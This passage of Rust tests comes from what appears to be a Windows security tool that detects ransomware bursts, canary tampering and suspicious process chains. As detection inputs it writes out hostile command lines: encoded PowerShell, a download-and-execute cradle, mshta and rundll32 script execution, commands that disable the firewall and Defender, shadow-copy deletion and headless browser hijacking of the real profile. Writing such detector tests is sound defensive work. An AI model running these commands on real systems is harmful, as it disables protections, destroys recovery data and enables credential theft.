            assert!(e > 7.5 && !naturally_high_entropy(&p));
            if let Some(a) = det.record(p, start + Duration::from_millis(100 * i)) {
                alarm.get_or_insert(a);
            }
        }
        assert!(alarm.is_some_and(|(files, new)| files.len() >= 20 && new));
        // The attack goes on: seen again after the next 20 files, but not as a new alarm –
        // and as a new one again when the window is over.
        let mut det = BurstDetector::new(Duration::from_secs(10), 20);
        let at = |det: &mut BurstDetector, n: u64, ms: u64| (0..n).filter_map(|i| det.record(PathBuf::from(format!("f{ms}-{i}")), start + Duration::from_millis(ms + i))).collect::<Vec<_>>();
        assert_eq!(at(&mut det, 20, 0).iter().map(|(_, new)| *new).collect::<Vec<_>>(), vec![true]);
        assert_eq!(at(&mut det, 19, 1000).len(), 0, "Zaehlung beginnt nach dem Alarm neu");
        assert_eq!(at(&mut det, 1, 2000).iter().map(|(_, new)| *new).collect::<Vec<_>>(), vec![false], "gleicher Angriff: keine zweite Meldung");
        assert_eq!(at(&mut det, 20, 30_000).iter().map(|(_, new)| *new).collect::<Vec<_>>(), vec![true], "nach dem Fenster: neuer Alarm");
        // New files (unpacking an archive, a download) count only while originals are deleted.
        let fresh = dir.path().join("ausgepackt.dat");
        std::fs::write(&fresh, crate::random_bytes(4096)).unwrap();
        assert!(!existed_before(&fresh, Duration::from_secs(8)));
        assert!(existed_before(&fresh, Duration::ZERO));
        assert!(!looks_encrypted_by_ransomware(&fresh, 0), "neu angelegt, nichts geloescht: zaehlt nicht");
        assert!(looks_encrypted_by_ransomware(&fresh, DELETIONS_FOR_NEW_FILES), "neu, aber Originale werden geloescht: zaehlt");
        let mut del = Deletions::default();
        for i in 0..6 {
            del.note(start + Duration::from_secs(i));
        }
        assert_eq!(del.recent(start + Duration::from_secs(6)), 6);
        assert_eq!(del.recent(start + Duration::from_secs(24)), 2, "aeltere Loeschungen fallen heraus");
        // Only files written just now count (a scan touching old encrypted files does not).
        let old = dir.path().join("brief0.txt");
        assert!(written_recently(&old, Duration::from_secs(15)));
        assert!(!written_recently(&old, Duration::ZERO) || std::fs::metadata(&old).unwrap().modified().unwrap().elapsed().unwrap().is_zero());
        assert!(!written_recently(&dir.path().join("fehlt.txt"), Duration::from_secs(15)));
        // Slow, normal activity does not trigger.
        let mut slow = BurstDetector::new(Duration::from_secs(10), 20);
        for i in 0..30 {
            assert!(slow.record(PathBuf::from(format!("x{i}")), start + Duration::from_secs(5 * i)).is_none());
        }
    }

    #[test]
    fn canary_files() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let c = ensure_canaries(&[dir.path().to_path_buf()]);
        // Two per folder: one that sorts to the very front, one to the very end.
        assert_eq!(c.len(), 2);
        let names: Vec<String> = c.iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
        assert!(names[0].starts_with('!') && names[1].starts_with('~'), "{names:?}");
        assert!(names[0].as_str() < "0" && names[1].as_str() > "z", "vor Ziffern und nach Buchstaben");
        assert!(c.iter().all(|p| is_canary(p) && !canary_tampered(p)));
        std::fs::write(&c[0], crate::random_bytes(1000)).unwrap();
        assert!(canary_tampered(&c[0]));
        std::fs::remove_file(&c[0]).unwrap();
        assert!(canary_tampered(&c[0]));
    }

    #[test]
    fn reading_a_canary_is_no_alarm() {
        // Like grep/type/backup: open, read, list the folder – no change event, no tampering.
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let c = ensure_canaries(&[dir.path().to_path_buf()]).remove(0);
        let (tx, rx) = std::sync::mpsc::channel();
        let d = dir.path().to_path_buf();
        std::thread::spawn(move || {
            let _ = watch_directory(&d, tx);
        });
        std::thread::sleep(Duration::from_millis(300));
        let content = std::fs::read(&c).unwrap();
        assert!(!content.is_empty());
        let _ = std::fs::read_dir(dir.path()).unwrap().count();
        let _ = std::fs::metadata(&c).unwrap();
        assert!(rx.recv_timeout(Duration::from_millis(800)).is_err(), "Lesen darf kein Ereignis auslösen");
        assert!(!canary_tampered(&c));
    }

    #[test]
    fn debouncer_waits_for_quiet_files() {
        let mut d = Debouncer::default();
        let t0 = Instant::now();
        d.touch("a".into(), t0);
        d.touch("b".into(), t0 + Duration::from_secs(1));
        assert_eq!(d.ready(t0 + Duration::from_millis(1500), Duration::from_secs(1)), vec![PathBuf::from("a")]);
        assert!(d.ready(t0 + Duration::from_millis(1600), Duration::from_secs(1)).is_empty());
        assert_eq!(d.ready(t0 + Duration::from_secs(3), Duration::from_secs(1)).len(), 1);
        assert!(d.is_empty());
    }

    #[test]
    fn process_chain_heuristics() {
        // fake chain: Word starts PowerShell with an encoded command
        let r = assess_process("WINWORD.EXE", "powershell.exe", "powershell -nop -w hidden -enc SQBFAFgA").unwrap();
        assert_eq!(r.2, Severity::Kritisch);
        assert!(r.0.starts_with("PROZESSKETTE:winword.exe>powershell.exe"));
        assert_eq!(assess_process("chrome.exe", "cmd.exe", "cmd /c echo hallo").unwrap().2, Severity::Hoch);
        assert!(assess_process("explorer.exe", "powershell.exe", "powershell -File C:\\skript.ps1").is_none());
        assert!(assess_process("explorer.exe", "powershell.exe", "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')").is_some());
        assert!(assess_process("chrome.exe", "chrome.exe", "--type=renderer").is_none());
        assert!(assess_process("excel.exe", "msiexec.exe", "msiexec /i update.msi").is_none());
    }

    #[test]
    fn techniques_from_the_sandbox_test_are_recognised() {
        // Atomic Red Team T1059.001 (shortened Base64), parent cmd.exe.
        let r = assess_process("cmd.exe", "powershell.exe", "powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcA").unwrap();
        assert!(r.1.contains("verschlüsselt"));
        assert!(assess_process("cmd.exe", "pwsh.exe", "pwsh -EC SQBFAFgAIAAoAE4AZQB3AC0ATwBi").is_some());
        assert!(assess_process("cmd.exe", "powershell.exe", "powershell -ExecutionPolicy Bypass -File C:\\x.ps1").is_none(), "-ExecutionPolicy ist kein -EncodedCommand");
        assert!(assess_process("cmd.exe", "powershell.exe", "powershell -e abc").is_none(), "kein Base64-Block");
        // T1218.005 / T1218.011: script code in the command line.
        assert!(assess_process("cmd.exe", "mshta.exe", "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"x\"\":close\")").is_some());
        assert!(assess_process("cmd.exe", "rundll32.exe", "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)").is_some());
        assert!(assess_process("explorer.exe", "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl").is_none());
        // Short-lived processes: the name comes from the command line, without ".exe".
        assert!(assess_process("cmd.exe", "mshta", "mshta vbscript:Execute(\"x\")").is_some());
        assert!(assess_process("cmd.exe", "rundll32", "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"").is_some());
        // Switching the protection of Windows off (sandbox test of 22.11.2026).
        let r = assess_process("cmd.exe", "netsh.exe", "netsh.exe advfirewall set allprofiles state off").unwrap();
        assert_eq!((r.0.as_str(), r.2), ("SCHUTZ:ABSCHALTEN", Severity::Hoch));
        assert!(r.1.starts_with("Die Windows-Firewall wird per Befehl abgeschaltet"));
        assert!(assess_process("cmd.exe", "netsh.exe", "netsh advfirewall set allprofiles state on").is_none());
        assert!(assess_process("cmd.exe", "netsh.exe", "netsh advfirewall show allprofiles state").is_none());
        let r = assess_process("explorer.exe", "powershell.exe", "powershell.exe -NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"").unwrap();
        assert_eq!(r.0, "SCHUTZ:ABSCHALTEN");
        assert!(assess_process("explorer.exe", "powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $false").is_none(), "wieder einschalten");
        assert_eq!(assess_process("cmd.exe", "powershell.exe", "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public").unwrap().0, "SCHUTZ:ABSCHALTEN");
        assert_eq!(assess_process("cmd.exe", "sc.exe", "sc config WinDefend start= disabled").unwrap().0, "SCHUTZ:ABSCHALTEN");
        assert_eq!(assess_process("cmd.exe", "net.exe", "net stop mpssvc").unwrap().0, "SCHUTZ:ABSCHALTEN");
        assert!(assess_process("cmd.exe", "sc.exe", "sc query windefend").is_none());
        // T1490: shadow copies.
        let r = assess_process("cmd.exe", "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet").unwrap();
        assert_eq!((r.0.as_str(), r.2), ("RANSOMWARE:WIEDERHERSTELLUNG", Severity::Kritisch));
        assert!(assess_process("cmd.exe", "vssadmin.exe", "vssadmin list shadows").is_none());
        assert!(assess_process("cmd.exe", "bcdedit.exe", "bcdedit /set {default} recoveryenabled No").is_some());
    }

    #[test]
    fn remote_controlled_browser_is_recognised() {
        // Headless with the real profile: the App-Bound-Encryption bypass of current stealers.
        let r = assess_process("stealer.exe", "chrome.exe", r#"chrome.exe --headless --remote-debugging-port=9222 --user-data-dir="C:\Users\f\AppData\Local\Google\Chrome\User Data""#).unwrap();
        assert_eq!((r.0.as_str(), r.2), ("BROWSER:FERNSTEUERUNG", Severity::Kritisch));
        assert_eq!(assess_process("powershell.exe", "msedge.exe", "msedge.exe --headless --remote-debugging-pipe").unwrap().2, Severity::Kritisch, "ohne --user-data-dir: echtes Profil");
        // Automation with its own temporary profile: high, not critical.
        let r = assess_process("node.exe", "chrome.exe", r"chrome --headless --remote-debugging-port=0 --user-data-dir=C:\Temp\puppeteer_dev_profile").unwrap();
        assert_eq!(r.2, Severity::Hoch);
        // The browser itself starting its helpers is fine; normal starts too.
        assert!(assess_process("chrome.exe", "chrome.exe", "--type=renderer --remote-debugging-port=0").is_none());
        assert!(assess_process("explorer.exe", "chrome.exe", "chrome.exe --profile-directory=Default").is_none());
        // Extension loaded from the user's folders at start.
        let local = std::env::var("LOCALAPPDATA").unwrap();
        let r = assess_process("explorer.exe", "chrome.exe", &format!(r#"chrome.exe --load-extension="{local}\ext\x""#)).unwrap();
        assert_eq!((r.0.as_str(), r.2), ("BROWSER:ERWEITERUNG-GELADEN", Severity::Hoch));
        assert!(assess_process("explorer.exe", "chrome.exe", r"chrome.exe --load-extension=C:\Program Files\Firma\Erweiterung").is_none());
    }

    #[test]
    fn live_system_queries_do_not_fail() {
        let snap = process_snapshot();
        let me = std::process::id();
        assert!(snap.contains_key(&me));
        assert!(process_path(me).is_some());
        let cmd = process_command_line(me).unwrap_or_default();
        assert!(!cmd.is_empty(), "Kommandozeile des eigenen Prozesses lesbar");
        let _ = tcp_connections();
        let _ = dns_cache_names();
        let _ = removable_drives();
        assert!(!default_watch_dirs().is_empty());
    }

    #[test]
    fn watcher_reports_new_file() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        let d = dir.path().to_path_buf();
        std::thread::spawn(move || {
            let _ = watch_directory(&d, tx);
        });
        std::thread::sleep(Duration::from_millis(300));
        std::fs::write(dir.path().join("neu.txt"), b"x").unwrap();
        let ev = rx.recv_timeout(Duration::from_secs(5)).unwrap();
        assert!(ev.path.ends_with("neu.txt"));
    }

    #[test]
    fn suspend_and_resume_child_process() {
        let mut child = std::process::Command::new("cmd").args(["/c", "ping -n 30 127.0.0.1 >nul"]).spawn().unwrap();
        let pid = child.id();
        assert!(suspend_process(pid));
        assert!(resume_process(pid));
        // Frozen by several messages: one release lets it run completely.
        std::thread::sleep(Duration::from_millis(200));
        assert_eq!(suspend_count(pid), 0);
        for _ in 0..3 {
            assert!(suspend_process(pid));
        }
        assert_eq!(suspend_count(pid), 3);
        assert!(resume_process(pid));
        assert_eq!(suspend_count(pid), 0, "eine Freigabe genügt");
        let (exe, start) = process_path_and_start(pid).unwrap();
        assert!(terminate_process(pid, None, Some(start)).is_err(), "ohne Programmpfad nie");
        assert!(terminate_process(pid, Some(&exe), None).is_err(), "ohne Startzeit nie");
        assert!(terminate_process(pid, Some(&exe), Some(start - 100 * SAME_START)).is_err(), "andere Startzeit: wiederverwendete ID");
        assert!(process_path(pid).is_some(), "nichts beendet");
        terminate_process(pid, Some(&exe), Some(start)).unwrap();
        let _ = child.wait();
    }

    #[test]
    fn the_cheap_process_list_names_the_same_processes() {
        let ids: HashSet<u32> = process_ids().into_iter().collect();
        assert!(ids.contains(&std::process::id()));
        let snap = process_snapshot();
        // Processes come and go between the two calls: nearly all must be in both.
        let common = snap.keys().filter(|p| ids.contains(p)).count();
        assert!(common * 10 >= snap.len() * 9, "{common} von {}", snap.len());
        // What a look costs (printed with --nocapture).
        let cpu = crate::scanner::process_cpu_seconds();
        for _ in 0..200 {
            let _ = process_ids();
        }
        let cheap = crate::scanner::process_cpu_seconds() - cpu;
        let cpu = crate::scanner::process_cpu_seconds();
        for _ in 0..200 {
            let _ = process_snapshot();
        }
        let full = crate::scanner::process_cpu_seconds() - cpu;
        println!("je Blick: nur IDs {:.3} ms, voller Schnappschuss {:.3} ms ({} Prozesse)", cheap * 5.0, full * 5.0, snap.len());
    }

    #[test]
    fn a_reused_process_id_is_never_ended() {
        let exe = Path::new(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
        let start = 133_000_000_000_000_000;
        assert!(same_process(7, Some((exe.to_path_buf(), start + 5)), exe, start).is_ok());
        // Same program, other instance that got the ID later.
        assert!(same_process(7, Some((exe.to_path_buf(), start + 60 * SAME_START)), exe, start).unwrap_err().contains("anderen Prozess"));
        // Other program with the ID.
        assert!(same_process(7, Some((PathBuf::from(r"C:\x\notepad.exe"), start)), exe, start).is_err());
        assert!(same_process(7, None, exe, start).unwrap_err().contains("läuft nicht mehr"));
    }
}

#[cfg(test)]
mod drive_tests {
    use super::*;

    #[test]
    fn local_drives_are_drive_roots_and_include_the_system_drive() {
        let drives = local_drives();
        assert!(!drives.is_empty());
        for d in &drives {
            let s = d.to_string_lossy();
            assert!(s.len() == 3 && s.ends_with(":\\"), "kein Laufwerk: {s}");
        }
        let system = format!("{}\\", std::env::var("SystemDrive").unwrap_or_else(|_| "C:".into()));
        assert!(drives.iter().any(|d| d.to_string_lossy().eq_ignore_ascii_case(&system)), "{drives:?}");
        // A plugged-in stick belongs to the full scan as well.
        for r in removable_drives() {
            assert!(drives.contains(&r), "{r:?} fehlt in {drives:?}");
        }
    }
}
